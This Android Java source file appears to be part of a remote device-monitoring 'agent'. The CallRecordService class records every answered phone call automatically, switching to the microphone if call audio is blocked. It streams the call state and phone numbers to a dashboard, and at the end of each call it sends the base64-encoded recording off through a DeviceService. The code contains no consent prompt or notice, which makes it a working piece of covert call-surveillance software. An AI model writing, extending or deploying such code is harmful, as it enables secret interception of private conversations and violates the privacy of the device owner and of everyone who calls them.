package com.mydevice.agent;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Records phone calls automatically when a call starts.
 * Note: Call recording may not work on Android 9+ due to OS restrictions.
 * Works best on Android 6-8 devices.
 */
public class CallRecordService extends BroadcastReceiver {

    private static final String TAG = "CallRecordService";
    private static MediaRecorder recorder;
    private static boolean isRecording = false;
    private static String currentRecordingPath;
    private static String currentPhoneNumber;
    private static long callStartTime;

    private static boolean wasRinging = false;
    private static boolean wasOffhook = false;

    @Override
    public void onReceive(Context context, Intent intent) {
        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
        String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

        if (number != null) {
            currentPhoneNumber = number;
        }

        // Emit real-time call state to dashboard
        if (DeviceService.isRunning && DeviceService.getInstance() != null) {
            try {
                JSONObject liveData = new JSONObject();
                liveData.put("number", currentPhoneNumber != null ? currentPhoneNumber : "unknown");
                liveData.put("timestamp", System.currentTimeMillis());

                if (TelephonyManager.EXTRA_STATE_RINGING.equals(state)) {
                    liveData.put("state", "ringing");
                    liveData.put("type", "incoming");
                    wasRinging = true;
                    DeviceService.getInstance().onLiveCallEvent(liveData);
                } else if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
                    liveData.put("state", "answered");
                    liveData.put("type", wasRinging ? "incoming" : "outgoing");
                    wasOffhook = true;
                    DeviceService.getInstance().onLiveCallEvent(liveData);
                } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
                    if (wasRinging && !wasOffhook) {
                        liveData.put("state", "ended");
                        liveData.put("type", "missed");
                    } else {
                        liveData.put("state", "ended");
                        liveData.put("type", wasRinging ? "incoming" : "outgoing");
                    }
                    DeviceService.getInstance().onLiveCallEvent(liveData);
                    wasRinging = false;
                    wasOffhook = false;
                }
            } catch (JSONException e) {
                Log.e(TAG, "Live call event error: " + e.getMessage());
            }
        }

        if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
            // Call answered - start recording
            startRecording(context);
        } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
            // Call ended - stop recording
            stopRecording(context);
        }
    }

    private void startRecording(Context context) {
        if (isRecording) return;

        try {
            File recordDir = new File(context.getExternalFilesDir(null), "recordings");
            if (!recordDir.exists()) recordDir.mkdirs();

            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            currentRecordingPath = new File(recordDir, "call_" + timestamp + ".3gp").getAbsolutePath();
            callStartTime = System.currentTimeMillis();

            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(currentRecordingPath);
            recorder.prepare();
            recorder.start();

            isRecording = true;
            Log.d(TAG, "Call recording started: " + currentRecordingPath);

        } catch (Exception e) {
            Log.e(TAG, "Failed to start recording: " + e.getMessage());
            // On newer Android versions, VOICE_COMMUNICATION may not work
            // Try with MIC source as fallback
            try {
                recorder = new MediaRecorder();
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                recorder.setOutputFile(currentRecordingPath);
                recorder.prepare();
                recorder.start();
                isRecording = true;
                Log.d(TAG, "Call recording started (MIC fallback): " + currentRecordingPath);
            } catch (Exception e2) {
                Log.e(TAG, "Recording completely failed: " + e2.getMessage());
                isRecording = false;
            }
        }
    }

    private void stopRecording(Context context) {
        if (!isRecording || recorder == null) return;

        try {
            recorder.stop();
            recorder.release();
            recorder = null;
            isRecording = false;

            long duration = (System.currentTimeMillis() - callStartTime) / 1000;

            Log.d(TAG, "Call recording stopped. Duration: " + duration + "s");

            // Notify DeviceService about the recording
            if (DeviceService.isRunning && DeviceService.getInstance() != null) {
                File recordFile = new File(currentRecordingPath);
                if (recordFile.exists() && recordFile.length() > 0) {
                    // Read file and convert to base64
                    FileInputStream fis = new FileInputStream(recordFile);
                    byte[] bytes = new byte[(int) recordFile.length()];
                    fis.read(bytes);
                    fis.close();

                    String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);

                    JSONObject data = new JSONObject();
                    data.put("number", currentPhoneNumber != null ? currentPhoneNumber : "unknown");
                    data.put("duration", duration);
                    data.put("timestamp", callStartTime);
                    data.put("audio", "data:audio/3gpp;base64," + base64);
                    data.put("fileName", recordFile.getName());
                    data.put("size", recordFile.length());

                    DeviceService.getInstance().onCallRecorded(data);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping recording: " + e.getMessage());
            recorder = null;
            isRecording = false;
        }
    }

    public static boolean isCurrentlyRecording() {
        return isRecording;
    }

    public static String getCurrentRecordingPath() {
        return currentRecordingPath;
    }
}
